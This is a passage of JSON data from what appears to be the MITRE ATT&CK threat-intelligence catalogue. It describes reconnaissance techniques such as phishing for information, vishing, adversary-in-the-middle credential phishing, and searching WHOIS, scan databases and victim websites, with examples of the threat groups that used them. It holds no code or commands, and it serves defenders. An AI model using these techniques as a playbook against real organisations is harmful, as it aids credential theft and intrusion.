housed. Physical locations may also indicate what legal jurisdiction and/or authorities the victim operates within.\nAdversaries may gather this information in various ways, such as direct elicitation via Phishing for Information. Physical locations of a target organization may also be exposed to adversaries via online or other accessible data sets (ex: Search Victim-Owned Websites or Social Media). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Phishing for Information or Search Open Websites/Domains), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: Phishing or Hardware Additions).", "id": "T1591.001", "examples": [{"id": "G0059", "name": "Magic Hound", "description": "Magic Hound has collected location information from visitors to their phishing sites."}]}, {"name": "Business Relationships", "description": "Adversaries may gather information about the victim's business relationships that can be used during targeting. Information about an organization\u2019s business relationships may include a variety of details, including second or third-party organizations/domains (ex: managed service providers, contractors, etc.) that have connected (and potentially elevated) network access. This information may also reveal supply chains and shipment paths for the victim\u2019s hardware and software resources.", "detailed_description": "Adversaries may gather information about the victim's business relationships that can be used during targeting. Information about an organization\u2019s business relationships may include a variety of details, including second or third-party organizations/domains (ex: managed service providers, contractors, etc.) that have connected (and potentially elevated) network access. This information may also reveal supply chains and shipment paths for the victim\u2019s hardware and software resources.\nAdversaries may gather this information in various ways, such as direct elicitation via Phishing for Information. Information about business relationships may also be exposed to adversaries via online or other accessible data sets (ex: Social Media or Search Victim-Owned Websites). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Phishing for Information or Search Open Websites/Domains), establishing operational resources (ex: Establish Accounts or Compromise Accounts), and/or initial access (ex: Supply Chain Compromise, Drive-by Compromise, or Trusted Relationship).", "id": "T1591.002", "examples": [{"id": "G0035", "name": "Dragonfly", "description": "Dragonfly has collected open source information to identify relationships between organizations for targeting purposes."}, {"id": "G1004", "name": "LAPSUS$", "description": "LAPSUS$ has gathered detailed knowledge of an organization's supply chain relationships."}, {"id": "G0034", "name": "Sandworm Team", "description": "In preparation for its attack against the 2018 Winter Olympics, Sandworm Team conducted online research of partner organizations listed on an official PyeongChang Olympics partnership site."}]}, {"name": "Identify Business Tempo", "description": "Adversaries may gather information about the victim's business tempo that can be used during targeting. Information about an organization\u2019s business tempo may include a variety of details, including operational hours/days of the week. This information may also reveal times/dates of purchases and shipments of the victim\u2019s hardware and software resources.", "detailed_description": "Adversaries may gather information about the victim's business tempo that can be used during targeting. Information about an organization\u2019s business tempo may include a variety of details, including operational hours/days of the week. This information may also reveal times/dates of purchases and shipments of the victim\u2019s hardware and software resources.\nAdversaries may gather this information in various ways, such as direct elicitation via Phishing for Information. Information about business tempo may also be exposed to adversaries via online or other accessible data sets (ex: Social Media or Search Victim-Owned Websites). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Phishing for Information or Search Open Websites/Domains), establishing operational resources (ex: Establish Accounts or Compromise Accounts), and/or initial access (ex: Supply Chain Compromise or Trusted Relationship)", "id": "T1591.003", "examples": []}, {"name": "Identify Roles", "description": "Adversaries may gather information about identities and roles within the victim organization that can be used during targeting. Information about business roles may reveal a variety of targetable details, including identifiable information for key personnel as well as what data/resources they have access to.", "detailed_description": "Adversaries may gather information about identities and roles within the victim organization that can be used during targeting. Information about business roles may reveal a variety of targetable details, including identifiable information for key personnel as well as what data/resources they have access to.\nAdversaries may gather this information in various ways, such as direct elicitation via Phishing for Information. Information about business roles may also be exposed to adversaries via online or other accessible data sets (ex: Social Media or Search Victim-Owned Websites). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Phishing for Information or Search Open Websites/Domains), establishing operational resources (ex: Establish Accounts or Compromise Accounts), and/or initial access (ex: Phishing).", "id": "T1591.004", "examples": [{"id": "G1001", "name": "HEXANE", "description": "HEXANE has identified executives, HR, and IT staff at victim organizations for further targeting."}, {"id": "G1004", "name": "LAPSUS$", "description": "LAPSUS$ has gathered detailed knowledge of team structures within a target organization."}, {"id": "C0022", "name": "Operation Dream Job", "description": "During Operation Dream Job, Lazarus Group targeted specific individuals within an organization with tailored job vacancy announcements."}, {"id": "G1017", "name": "Volt Typhoon", "description": "Volt Typhoon has identified key network and IT staff members pre-compromise at targeted organizations."}]}]}, {"name": "Phishing for Information", "description": "Adversaries may send phishing messages to elicit sensitive information that can be used during targeting. Phishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Phishing for information is different from Phishing in that the objective is gathering data from the victim rather than executing malicious code.", "detailed_description": "Adversaries may send phishing messages to elicit sensitive information that can be used during targeting. Phishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Phishing for information is different from Phishing in that the objective is gathering data from the victim rather than executing malicious code.\nAll forms of phishing are electronically delivered social engineering. Phishing can be targeted, known as spearphishing. In spearphishing, a specific individual, company, or industry will be targeted by the adversary. More generally, adversaries can conduct non-targeted phishing, such as in mass credential harvesting campaigns.\nAdversaries may also try to obtain information directly through the exchange of emails, instant messages, or other electronic conversation means. Victims may also receive phishing messages that direct them to call a phone number where the adversary attempts to collect confidential information.\nPhishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: Establish Accounts or Compromise Accounts) and/or sending multiple, seemingly urgent messages. Another way to accomplish this is by forging or spoofing the identity of the sender which can be used to fool both the human recipient as well as automated security tools.\nPhishing for information may also involve evasive techniques, such as removing or manipulating emails or metadata/headers from compromised accounts being abused to send messages (e.g., Email Hiding Rules).", "id": "T1598", "examples": [{"id": "G0007", "name": "APT28", "description": "APT28 has used spearphishing to compromise credentials."}, {"id": "G0094", "name": "Kimsuky", "description": "Kimsuky has used tailored spearphishing emails to gather victim information including contat lists to identify additional targets."}, {"id": "G1036", "name": "Moonstone Sleet", "description": "Moonstone Sleet has interacted with victims to gather information via email."}, {"id": "G1015", "name": "Scattered Spider", "description": "Scattered Spider has used a combination of credential phishing and social engineering to capture one-time-password (OTP) codes."}, {"id": "G0128", "name": "ZIRCONIUM", "description": "ZIRCONIUM targeted presidential campaign staffers with credential phishing e-mails."}], "sub_techniques": [{"name": "Spearphishing Service", "description": "Adversaries may send spearphishing messages via third-party services to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: Establish Accounts or Compromise Accounts) and/or sending multiple, seemingly urgent messages.", "detailed_description": "Adversaries may send spearphishing messages via third-party services to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: Establish Accounts or Compromise Accounts) and/or sending multiple, seemingly urgent messages.\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries send messages through various social media services, personal webmail, and other non-enterprise controlled services. These services are more likely to have a less-strict security policy than an enterprise. As with most kinds of spearphishing, the goal is to generate rapport with the target or get the target's interest in some way. Adversaries may create fake social media accounts and message employees for potential job opportunities. Doing so allows a plausible reason for asking about services, policies, and information about their environment. Adversaries may also use information from previous reconnaissance efforts (ex: Social Media or Search Victim-Owned Websites) to craft persuasive and believable lures.", "id": "T1598.001", "examples": [{"id": "C0027", "name": "C0027", "description": "During C0027, Scattered Spider sent Telegram messages impersonating IT personnel to harvest credentials."}]}, {"name": "Spearphishing Attachment", "description": "Adversaries may send spearphishing messages with a malicious attachment to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: Establish Accounts or Compromise Accounts) and/or sending multiple, seemingly urgent messages.", "detailed_description": "Adversaries may send spearphishing messages with a malicious attachment to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: Establish Accounts or Compromise Accounts) and/or sending multiple, seemingly urgent messages.\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon the recipient populating information then returning the file. The text of the spearphishing email usually tries to give a plausible reason why the file should be filled-in, such as a request for information from a business associate. Adversaries may also use information from previous reconnaissance efforts (ex: Search Open Websites/Domains or Search Victim-Owned Websites) to craft persuasive and believable lures.", "id": "T1598.002", "examples": [{"id": "G0035", "name": "Dragonfly", "description": "Dragonfly has used spearphishing with Microsoft Office attachments to enable harvesting of user credentials."}, {"id": "G1008", "name": "SideCopy", "description": "SideCopy has crafted generic lures for spam campaigns to collect emails and credentials for targeting efforts."}, {"id": "G0121", "name": "Sidewinder", "description": "Sidewinder has sent e-mails with malicious attachments that lead victims to credential harvesting websites."}, {"id": "G1033", "name": "Star Blizzard", "description": "Star Blizzard has sent emails to establish rapport with targets eventually sending messages with attachments containing links to credential-stealing sites."}]}, {"name": "Spearphishing Link", "description": "Adversaries may send spearphishing messages with a malicious link to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: Establish Accounts or Compromise Accounts) and/or sending multiple, seemingly urgent messages.", "detailed_description": "Adversaries may send spearphishing messages with a malicious link to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: Establish Accounts or Compromise Accounts) and/or sending multiple, seemingly urgent messages.\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, the malicious emails contain links generally accompanied by social engineering text to coax the user to actively click or copy and paste a URL into a browser. The given website may be a clone of a legitimate site (such as an online or corporate login portal) or may closely resemble a legitimate site in appearance and have a URL containing elements from the real site. URLs may also be obfuscated by taking advantage of quirks in the URL schema, such as the acceptance of integer- or hexadecimal-based hostname formats and the automatic discarding of text before an \"@\" symbol: for example, hxxp://google.com@1157586937.\nAdversaries may also embed \"tracking pixels\", \"web bugs\", or \"web beacons\" within phishing messages to verify the receipt of an email, while also potentially profiling and tracking victim information such as IP address.  These mechanisms often appear as small images (typically one pixel in size) or otherwise obfuscated objects and are typically delivered as HTML code containing a link to a remote server.\nAdversaries may also be able to spoof a complete website using what is known as a \"browser-in-the-browser\" (BitB) attack. By generating a fake browser popup window with an HTML-based address bar that appears to contain a legitimate URL (such as an authentication portal), they may be able to prompt users to enter their credentials while bypassing typical URL verification methods.\nAdversaries can use phishing kits such as EvilProxy and Evilginx2 to perform adversary-in-the-middle phishing by proxying the connection between the victim and the legitimate website. On a successful login, the victim is redirected to the legitimate website, while the adversary captures their session cookie (i.e., Steal Web Session Cookie) in addition to their username and password. This may enable the adversary to then bypass MFA via Web Session Cookie.\nAdversaries may also send a malicious link in the form of Quick Response (QR) Codes (also known as \"quishing\"). These links may direct a victim to a credential phishing page. By using a QR code, the URL may not be exposed in the email and may thus go undetected by most automated email security scans. These QR codes may be scanned by or delivered directly  to a user\u2019s mobile device (i.e., Phishing), which may be less secure in several relevant ways. For example, mobile users may not be able to notice minor differences between genuine and credential harvesting websites due to mobile\u2019s smaller form factor.\nFrom the fake website, information is gathered in web forms and sent to the adversary. Adversaries may also use information from previous reconnaissance efforts (ex: Search Open Websites/Domains or Search Victim-Owned Websites) to craft persuasive and believable lures.", "id": "T1598.003", "examples": [{"id": "S0677", "name": "AADInternals", "description": "AADInternals can send phishing emails containing malicious links designed to collect users\u2019 credentials."}, {"id": "G0007", "name": "APT28", "description": "APT28 has conducted credential phishing campaigns with links that redirect to credential harvesting sites."}, {"id": "G0050", "name": "APT32", "description": "APT32 has used malicious links to direct users to web pages designed to harvest credentials."}, {"id": "G1012", "name": "CURIUM", "description": "CURIUM used malicious links to adversary-controlled resources for credential harvesting."}, {"id": "G0035", "name": "Dragonfly", "description": "Dragonfly has used spearphishing with PDF attachments containing malicious links that redirected to credential harvesting websites."}, {"id": "G0094", "name": "Kimsuky", "description": "Kimsuky has used links in e-mail to steal account information including web beacons for target profiling."}, {"id": "G0059", "name": "Magic Hound", "description": "Magic Hound has used SMS and email messages with links designed to steal credentials or track victims."}, {"id": "G1036", "name": "Moonstone Sleet", "description": "Moonstone Sleet used spearphishing messages containing items such as tracking pixels to determine if users interacted with malicious messages."}, {"id": "G0129", "name": "Mustang Panda", "description": "Mustang Panda has delivered web bugs to profile their intended targets."}, {"id": "G0040", "name": "Patchwork", "description": "Patchwork has used embedded image tags (known as web bugs) with unique, per-recipient tracking links in their emails for the purpose of identifying which recipients opened messages."}, {"id": "G0034", "name": "Sandworm Team", "description": "Sandworm Team has crafted spearphishing emails with hyperlinks designed to trick unwitting recipients into revealing their account credentials."}, {"id": "G0121", "name": "Sidewinder", "description": "Sidewinder has sent e-mails with malicious links to credential harvesting websites."}, {"id": "G0122", "name": "Silent Librarian", "description": "Silent Librarian has used links in e-mails to direct victims to credential harvesting websites designed to appear like the targeted organization's login page."}, {"id": "S0649", "name": "SMOKEDHAM", "description": "SMOKEDHAM has been delivered via malicious links in phishing emails."}, {"id": "G1033", "name": "Star Blizzard", "description": "Star Blizzard has sent emails to establish rapport with targets eventually sending messages with links to credential-stealing sites."}, {"id": "G0128", "name": "ZIRCONIUM", "description": "ZIRCONIUM has used web beacons in e-mails to track hits to attacker-controlled URL's."}]}, {"name": "Spearphishing Voice", "description": "Adversaries may use voice communications to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: Impersonation) and/or creating a sense of urgency or alarm for the recipient.", "detailed_description": "Adversaries may use voice communications to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: Impersonation) and/or creating a sense of urgency or alarm for the recipient.\nAll forms of phishing are electronically delivered social engineering. In this scenario, adversaries use phone calls to elicit sensitive information from victims. Known as voice phishing (or \"vishing\"), these communications can be manually executed by adversaries, hired call centers, or even automated via robocalls. Voice phishers may spoof their phone number while also posing as a trusted entity, such as a business partner or technical support staff.\nVictims may also receive phishing messages that direct them to call a phone number (\"callback phishing\") where the adversary attempts to collect confidential information.\nAdversaries may also use information from previous reconnaissance efforts (ex: Search Open Websites/Domains or Search Victim-Owned Websites) to tailor pretexts to be even more persuasive and believable for the victim.", "id": "T1598.004", "examples": [{"id": "C0027", "name": "C0027", "description": "During C0027, Scattered Spider used phone calls to instruct victims to navigate to credential-harvesting websites."}, {"id": "G1004", "name": "LAPSUS$", "description": "LAPSUS$ has called victims' help desk to convince the support personnel to reset a privileged account\u2019s credentials."}, {"id": "G1015", "name": "Scattered Spider", "description": "During C0027, Scattered Spider used phone calls to instruct victims to navigate to credential-harvesting websites.Scattered Spider has also called employees at target organizations and compelled them to navigate to fake login portals using adversary-in-the-middle toolkits."}]}]}, {"name": "Search Closed Sources", "description": "Adversaries may search and gather information about victims from closed (e.g., paid, private, or otherwise not freely available) sources that can be used during targeting. Information about victims may be available for purchase from reputable private sources and databases, such as paid subscriptions to feeds of technical/threat intelligence data. Adversaries may also purchase information from less-reputable sources such as dark web or cybercrime blackmarkets.", "detailed_description": "Adversaries may search and gather information about victims from closed (e.g., paid, private, or otherwise not freely available) sources that can be used during targeting. Information about victims may be available for purchase from reputable private sources and databases, such as paid subscriptions to feeds of technical/threat intelligence data. Adversaries may also purchase information from less-reputable sources such as dark web or cybercrime blackmarkets.\nAdversaries may search in different closed databases depending on what information they seek to gather. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: Phishing for Information or Search Open Websites/Domains), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: External Remote Services or Valid Accounts).", "id": "T1597", "examples": [{"id": "G1011", "name": "EXOTIC LILY", "description": "EXOTIC LILY has searched for information on targeted individuals on business databases including RocketReach and CrunchBase."}], "sub_techniques": [{"name": "Threat Intel Vendors", "description": "Adversaries may search private data from threat intelligence vendors for information that can be used during targeting. Threat intelligence vendors may offer paid feeds or portals that offer more data than what is publicly reported. Although sensitive details (such as customer names and other identifiers) may be redacted, this information may contain trends regarding breaches such as target industries, attribution claims, and successful TTPs/countermeasures.", "detailed_description": "Adversaries may search private data from threat intelligence vendors for information that can be used during targeting. Threat intelligence vendors may offer paid feeds or portals that offer more data than what is publicly reported. Although sensitive details (such as customer names and other identifiers) may be redacted, this information may contain trends regarding breaches such as target industries, attribution claims, and successful TTPs/countermeasures.\nAdversaries may search in private threat intelligence vendor data to gather actionable information. Threat actors may seek information/indicators gathered about their own campaigns, as well as those conducted by other adversaries that may align with their target industries, capabilities/objectives, or other operational concerns. Information reported by vendors may also reveal opportunities other forms of reconnaissance (ex: Search Open Websites/Domains), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: Exploit Public-Facing Application or External Remote Services).", "id": "T1597.001", "examples": []}, {"name": "Purchase Technical Data", "description": "Adversaries may purchase technical information about victims that can be used during targeting. Information about victims may be available for purchase within reputable private sources and databases, such as paid subscriptions to feeds of scan databases or other data aggregation services. Adversaries may also purchase information from less-reputable sources such as dark web or cybercrime blackmarkets.", "detailed_description": "Adversaries may purchase technical information about victims that can be used during targeting. Information about victims may be available for purchase within reputable private sources and databases, such as paid subscriptions to feeds of scan databases or other data aggregation services. Adversaries may also purchase information from less-reputable sources such as dark web or cybercrime blackmarkets.\nAdversaries may purchase information about their already identified targets, or use purchased data to discover opportunities for successful breaches. Threat actors may gather various technical details from purchased data, including but not limited to employee contact information, credentials, or specifics regarding a victim\u2019s infrastructure. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: Phishing for Information or Search Open Websites/Domains), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: External Remote Services or Valid Accounts).", "id": "T1597.002", "examples": [{"id": "G1004", "name": "LAPSUS$", "description": "LAPSUS$ has purchased credentials and session tokens from criminal underground forums."}]}]}, {"name": "Search Open Technical Databases", "description": "Adversaries may search freely available technical databases for information about victims that can be used during targeting. Information about victims may be available in online databases and repositories, such as registrations of domains/certificates as well as public collections of network data/artifacts gathered from traffic and/or scans.", "detailed_description": "Adversaries may search freely available technical databases for information about victims that can be used during targeting. Information about victims may be available in online databases and repositories, such as registrations of domains/certificates as well as public collections of network data/artifacts gathered from traffic and/or scans.\nAdversaries may search in different open databases depending on what information they seek to gather. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: Phishing for Information or Search Open Websites/Domains), establishing operational resources (ex: Acquire Infrastructure or Compromise Infrastructure), and/or initial access (ex: External Remote Services or Trusted Relationship).", "id": "T1596", "examples": [], "sub_techniques": [{"name": "DNS/Passive DNS", "description": "Adversaries may search DNS data for information about victims that can be used during targeting. DNS information may include a variety of details, including registered name servers as well as records that outline addressing for a target\u2019s subdomains, mail servers, and other hosts.", "detailed_description": "Adversaries may search DNS data for information about victims that can be used during targeting. DNS information may include a variety of details, including registered name servers as well as records that outline addressing for a target\u2019s subdomains, mail servers, and other hosts.\nAdversaries may search DNS data to gather actionable information. Threat actors can query nameservers for a target organization directly, or search through centralized repositories of logged DNS query responses (known as passive DNS). Adversaries may also seek and target DNS misconfigurations/leaks that reveal information about internal networks. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: Search Victim-Owned Websites or Search Open Websites/Domains), establishing operational resources (ex: Acquire Infrastructure or Compromise Infrastructure), and/or initial access (ex: External Remote Services or Trusted Relationship).", "id": "T1596.001", "examples": []}, {"name": "WHOIS", "description": "Adversaries may search public WHOIS data for information about victims that can be used during targeting. WHOIS data is stored by regional Internet registries (RIR) responsible for allocating and assigning Internet resources such as domain names. Anyone can query WHOIS servers for information about a registered domain, such as assigned IP blocks, contact information, and DNS nameservers.", "detailed_description": "Adversaries may search public WHOIS data for information about victims that can be used during targeting. WHOIS data is stored by regional Internet registries (RIR) responsible for allocating and assigning Internet resources such as domain names. Anyone can query WHOIS servers for information about a registered domain, such as assigned IP blocks, contact information, and DNS nameservers.\nAdversaries may search WHOIS data to gather actionable information. Threat actors can use online resources or command-line utilities to pillage through WHOIS data for information about potential victims. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: Active Scanning or Phishing for Information), establishing operational resources (ex: Acquire Infrastructure or Compromise Infrastructure), and/or initial access (ex: External Remote Services or Trusted Relationship).", "id": "T1596.002", "examples": []}, {"name": "Digital Certificates", "description": "Adversaries may search public digital certificate data for information about victims that can be used during targeting. Digital certificates are issued by a certificate authority (CA) in order to cryptographically verify the origin of signed content. These certificates, such as those used for encrypted web traffic (HTTPS SSL/TLS communications), contain information about the registered organization such as name and location.", "detailed_description": "Adversaries may search public digital certificate data for information about victims that can be used during targeting. Digital certificates are issued by a certificate authority (CA) in order to cryptographically verify the origin of signed content. These certificates, such as those used for encrypted web traffic (HTTPS SSL/TLS communications), contain information about the registered organization such as name and location.\nAdversaries may search digital certificate data to gather actionable information. Threat actors can use online resources and lookup tools to harvest information about certificates. Digital certificate data may also be available from artifacts signed by the organization (ex: certificates used from encrypted web traffic are served with content). Information from these sources may reveal opportunities for other forms of reconnaissance (ex: Active Scanning or Phishing for Information), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: External Remote Services or Trusted Relationship).", "id": "T1596.003", "examples": []}, {"name": "CDNs", "description": "Adversaries may search content delivery network (CDN) data about victims that can be used during targeting. CDNs allow an organization to host content from a distributed, load balanced array of servers. CDNs may also allow organizations to customize content delivery based on the requestor\u2019s geographical region.", "detailed_description": "Adversaries may search content delivery network (CDN) data about victims that can be used during targeting. CDNs allow an organization to host content from a distributed, load balanced array of servers. CDNs may also allow organizations to customize content delivery based on the requestor\u2019s geographical region.\nAdversaries may search CDN data to gather actionable information. Threat actors can use online resources and lookup tools to harvest information about content servers within a CDN. Adversaries may also seek and target CDN misconfigurations that leak sensitive information not intended to be hosted and/or do not have the same protection mechanisms (ex: login portals) as the content hosted on the organization\u2019s website. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: Active Scanning or Search Open Websites/Domains), establishing operational resources (ex: Acquire Infrastructure or Compromise Infrastructure), and/or initial access (ex: Drive-by Compromise).", "id": "T1596.004", "examples": []}, {"name": "Scan Databases", "description": "Adversaries may search within public scan databases for information about victims that can be used during targeting. Various online services continuously publish the results of Internet scans/surveys, often harvesting information such as active IP addresses, hostnames, open ports, certificates, and even server banners.", "detailed_description": "Adversaries may search within public scan databases for information about victims that can be used during targeting. Various online services continuously publish the results of Internet scans/surveys, often harvesting information such as active IP addresses, hostnames, open ports, certificates, and even server banners.\nAdversaries may search scan databases to gather actionable information. Threat actors can use online resources and lookup tools to harvest information from these services. Adversaries may seek information about their already identified targets, or use these datasets to discover opportunities for successful breaches. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: Active Scanning or Search Open Websites/Domains), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: External Remote Services or Exploit Public-Facing Application).", "id": "T1596.005", "examples": [{"id": "G0096", "name": "APT41", "description": "APT41 uses the Chinese website fofa.su, similar to the Shodan scanning service, for passive scanning of victims."}, {"id": "C0040", "name": "APT41 DUST", "description": "APT41 DUST used internet scan data for target development."}, {"id": "G1017", "name": "Volt Typhoon", "description": "Volt Typhoon has used FOFA, Shodan, and Censys to search for exposed victim infrastructure."}]}]}, {"name": "Search Open Websites/Domains", "description": "Adversaries may search freely available websites and/or domains for information about victims that can be used during targeting. Information about victims may be available in various online sites, such as social media, new sites, or those hosting information about business operations such as hiring or requested/rewarded contracts.", "detailed_description": "Adversaries may search freely available websites and/or domains for information about victims that can be used during targeting. Information about victims may be available in various online sites, such as social media, new sites, or those hosting information about business operations such as hiring or requested/rewarded contracts.\nAdversaries may search in different online sites depending on what information they seek to gather. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: Phishing for Information or Search Open Technical Databases), establishing operational resources (ex: Establish Accounts or Compromise Accounts), and/or initial access (ex: External Remote Services or Phishing).", "id": "T1593", "examples": [{"id": "G0034", "name": "Sandworm Team", "description": "Sandworm Team researched Ukraine's unique legal entity identifier (called an \"EDRPOU\" number), including running queries on the EDRPOU website, in preparation for the NotPetya attack. Sandworm Team has also researched third-party websites to help it craft credible spearphishing emails."}, {"id": "G1033", "name": "Star Blizzard", "description": "Star Blizzard has used open-source research to identify information about victims to use in targeting."}, {"id": "G1017", "name": "Volt Typhoon", "description": "Volt Typhoon has conducted pre-compromise web searches for victim information."}], "sub_techniques": [{"name": "Social Media", "description": "Adversaries may search social media for information about victims that can be used during targeting. Social media sites may contain various information about a victim organization, such as business announcements as well as information about the roles, locations, and interests of staff.", "detailed_description": "Adversaries may search social media for information about victims that can be used during targeting. Social media sites may contain various information about a victim organization, such as business announcements as well as information about the roles, locations, and interests of staff.\nAdversaries may search in different social media sites depending on what information they seek to gather. Threat actors may passively harvest data from these sites, as well as use information gathered to create fake profiles/groups to elicit victim\u2019s into revealing specific information (i.e. Spearphishing Service). Information from these sources may reveal opportunities for other forms of reconnaissance (ex: Phishing for Information or Search Open Technical Databases), establishing operational resources (ex: Establish Accounts or Compromise Accounts), and/or initial access (ex: Spearphishing via Service).", "id": "T1593.001", "examples": [{"id": "G1011", "name": "EXOTIC LILY", "description": "EXOTIC LILY has copied data from social media sites to impersonate targeted individuals."}, {"id": "G0094", "name": "Kimsuky", "description": "Kimsuky has used Twitter to monitor potential victims and to prepare targeted phishing e-mails."}, {"id": "C0022", "name": "Operation Dream Job", "description": "For Operation Dream Job, Lazarus Group used LinkedIn to identify and target employees within a chosen organization."}]}, {"name": "Search Engines", "description": "Adversaries may use search engines to collect information about victims that can be used during targeting. Search engine services typical crawl online sites to index context and may provide users with specialized syntax to search for specific keywords or specific types of content (i.e. filetypes).", "detailed_description": "Adversaries may use search engines to collect information about victims that can be used during targeting. Search engine services typical crawl online sites to index context and may provide users with specialized syntax to search for specific keywords or specific types of content (i.e. filetypes).\nAdversaries may craft various search engine queries depending on what information they seek to gather. Threat actors may use search engines to harvest general information about victims, as well as use specialized queries to look for spillages/leaks of sensitive information such as network details or credentials. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: Phishing for Information or Search Open Technical Databases), establishing operational resources (ex: Establish Accounts or Compromise Accounts), and/or initial access (ex: Valid Accounts or Phishing).", "id": "T1593.002", "examples": [{"id": "C0040", "name": "APT41 DUST", "description": "APT41 DUST involved use of search engines to research victim servers."}, {"id": "G0094", "name": "Kimsuky", "description": "Kimsuky has searched for vulnerabilities, tools, and geopolitical trends on Google to target victims."}]}, {"name": "Code Repositories", "description": "Adversaries may search public code repositories for information about victims that can be used during targeting. Victims may store code in repositories on various third-party websites such as GitHub, GitLab, SourceForge, and BitBucket. Users typically interact with code repositories through a web application or command-line utilities such as git.", "detailed_description": "Adversaries may search public code repositories for information about victims that can be used during targeting. Victims may store code in repositories on various third-party websites such as GitHub, GitLab, SourceForge, and BitBucket. Users typically interact with code repositories through a web application or command-line utilities such as git.\nAdversaries may search various public code repositories for various information about a victim. Public code repositories can often be a source of various general information about victims, such as commonly used programming languages and libraries as well as the names of employees. Adversaries may also identify more sensitive data, including accidentally leaked credentials or API keys. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: Phishing for Information), establishing operational resources (ex: Compromise Accounts or Compromise Infrastructure), and/or initial access (ex: Valid Accounts or Phishing).\nNote: This is distinct from Code Repositories, which focuses on Collection from private and internally hosted code repositories.", "id": "T1593.003", "examples": [{"id": "G1004", "name": "LAPSUS$", "description": "LAPSUS$ has searched public code repositories for exposed credentials."}]}]}, {"name": "Search Victim-Owned Websites", "description": "Adversaries may search websites owned by the victim for information that can be used during targeting. Victim-owned websites may contain a variety of details, including names of departments/divisions, physical locations, and data about key employees such as names, roles, and contact info (ex: Email Addresses). These sites may also have details highlighting business operations and relationships.", "detailed_description": "Adversaries may search websites owned by the victim for information that can be used during targeting. Victim-owned websites may contain a variety of details, including names of departments/divisions, physical locations, and data about key employees such as names, roles, and contact info (ex: Email Addresses). These sites may also have details highlighting business operations and relationships.\nAdversaries may search victim-owned websites to gather actionable information. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: Phishing for Information or Search Open Technical Databases), establishing operational resources (ex: Establish Accounts or Compromise Accounts), and/or initial access (ex: Trusted Relationship or Phishing).\nIn addition to manually browsing the website, adversaries may attempt to identify hidden directories or files that could contain additional sensitive information or vulnerable functionality. They may do this through automated activities such as Wordlist Scanning, as well as by leveraging files such as sitemap.xml and robots.txt.", "id": "T1594", "examples": [{"id": "C0040", "name": "APT41 DUST", "description": "APT41 DUST involved access of external victim websites for target development."}, {"id": "C0029", "name": "Cutting Edge", "description": "During Cutting Edge, threat actors peformed reconnaissance of victims' internal websites via proxied connections."}, {"id": "G1011", "name": "EXOTIC LILY", "description": "EXOTIC LILY has used contact forms on victim websites to generate phishing e-mails."}, {"id": "G0094", "name": "Kimsuky", "description": "Kimsuky has searched for information on the target company's website."}, {"id": "G0034", "name": "Sandworm Team", "description": "Sandworm Team has conducted research against potential victim websites as part of its operational planning."}, {"id": "G0122", "name": "Silent Librarian", "description": "Silent Librarian has searched victim's websites to identify the interests and academic areas of targeted individuals and to scrape source code, branding, and organizational contact information for phishing pages."}, {"id": "G1038", "name": "TA578", "description": "TA578 has filled out contact forms on victims' websites to direct them to adversary-controlled URLs."}, {"id": "G1017", "name": "Volt Typhoon", "description": "Volt Typhoon has conducted pre-compromise reconnaissance on victim-owned sites."}], "sub_techniques": []}]}, {"name": "Resource Development", "description": "The adversary is trying to establish resources they can use to support operations.Resource Development consists of techniques that involve adversaries creating, purchasing, or compromising/stealing resources that can be used to support targeting. Such resources include infrastructure, accounts, or capabilities. These resources can be leveraged by the adversary to aid in other phases of the adversary lifecycle, such as using purchased domains to support Command and Control, email accounts for phishing as a part of Initial Access, or stealing code signing 